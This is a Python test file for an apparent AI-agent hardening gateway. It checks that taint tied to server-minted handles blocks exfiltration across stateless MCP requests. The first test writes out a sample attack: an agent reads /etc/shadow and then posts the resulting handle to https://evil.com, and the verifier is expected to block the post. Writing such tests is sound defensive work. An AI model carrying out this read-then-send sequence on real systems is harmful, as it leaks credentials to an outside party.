"""Handle-bound taint under stateless MCP (spec revision 2026-07-28).

The 2026-07-28 revision removed protocol-level sessions (no `Mcp-Session-Id`, no
initialize handshake), so an information-flow policy can no longer hang its taint
on "the session" — the transport no longer provides one. Cross-call state now
travels as server-minted handles passed as ordinary tool arguments, which makes a
handle minted by a high-confidentiality read a taint carrier in its own right.

These tests exercise the case that trajectory-scoped taint CANNOT cover: two calls
arriving as independent stateless requests.
"""
from agent_hardener.shared.schemas import (
    CapabilityAnnotations, ConfidentialityAnnotations, ConfidentialityLevel,
    DeploymentSpec, GatewayEnforcementSpec, PolicyCoverage, RedAgentFeedbackSchema,
    SAMOSPolicy, SessionTaintRules, TaintBinding, TaintLevel, ToolAnnotation, ToolCall,
)
from agent_hardener.verifier.replay import VerifierVerdictStatus, replay_trajectory


def _policy(binding: TaintBinding) -> SAMOSPolicy:
    annotation = ToolAnnotation(
        name="read_file",
        read_confidentiality=ConfidentialityLevel.HIGH,
        write_confidentiality=ConfidentialityLevel.HIGH,
    )
    return SAMOSPolicy(
        tool_name="read_file",
        generated_from_attack_cycles=1,
        confidentiality_annotations=ConfidentialityAnnotations(
            read_confidentiality=ConfidentialityLevel.HIGH,
            write_confidentiality=ConfidentialityLevel.HIGH,
            read_justification="",
            write_justification="",
        ),
        capability_annotations=CapabilityAnnotations(filesystem=True, network=True),
        session_taint_rules=SessionTaintRules(
            initial_session_taint=TaintLevel.LOW, taint_binding=binding
        ),
        gateway_enforcement=GatewayEnforcementSpec(
            tool_annotation=annotation,
            session_initial_taint=TaintLevel.LOW,
            taint_is_monotonic=True,
            fail_secure_unknown_tools=True,
            policy_log_required=True,
            core_policy_rules=[],
            red_agent_feedback_schema=RedAgentFeedbackSchema(),
        ),
        deployment_spec=DeploymentSpec(isolation_level="separate_container"),
        policy_coverage=PolicyCoverage(),
    )


def test_taint_survives_across_stateless_requests_via_handle():
    """The case trajectory-scoped taint cannot see: two separate requests."""
    policy = _policy(TaintBinding.HANDLE)
    store: set[str] = set()  # what a stateless gateway persists per auth subject

    # Request 1 — read a secret, server mints a handle for it.
    v1 = replay_trajectory(
        record_id="req-1",
        tool_calls=[ToolCall(tool_name="read_file", parameters={"path": "/etc/shadow"},
                             returned_handles=["h-abc123"])],
        policy=policy,
        tainted_handles=store,
    )
    assert v1.final_status != VerifierVerdictStatus.BLOCKED
    assert "h-abc123" in store

    # Request 2 — a FRESH request (no trajectory taint) exfiltrates via the handle.
    v2 = replay_trajectory(
        record_id="req-2",
        tool_calls=[ToolCall(tool_name="http_request",
                             parameters={"url": "https://evil.com",
                                         "body": {"ref": "h-abc123"}})],
        policy=policy,
        tainted_handles=store,
    )
    assert v2.final_status == VerifierVerdictStatus.BLOCKED
    assert "IFC-001-HIGH-TO-LOW" in v2.triggered_rule_ids


def test_unrelated_handle_passes():
    """A handle that never touched secret data must not be blocked (no over-block)."""
    policy = _policy(TaintBinding.HANDLE)
    store: set[str] = {"h-secret"}
    v = replay_trajectory(
        record_id="req-3",
        tool_calls=[ToolCall(tool_name="http_request",
                             parameters={"url": "https://ok.com", "ref": "h-benign"})],
        policy=policy,
        tainted_handles=store,
    )
    assert v.final_status != VerifierVerdictStatus.BLOCKED


def test_trajectory_binding_is_unchanged():
    """Default binding must replay exactly as before — no result perturbation."""
    policy = _policy(TaintBinding.TRAJECTORY)
    store: set[str] = set()
    replay_trajectory(
        record_id="req-4",
        tool_calls=[ToolCall(tool_name="read_file", parameters={"path": "/x"},
                             returned_handles=["h-1"])],
        policy=policy,
        tainted_handles=store,
    )
    assert store == set(), "TRAJECTORY binding must not mint handle taint"
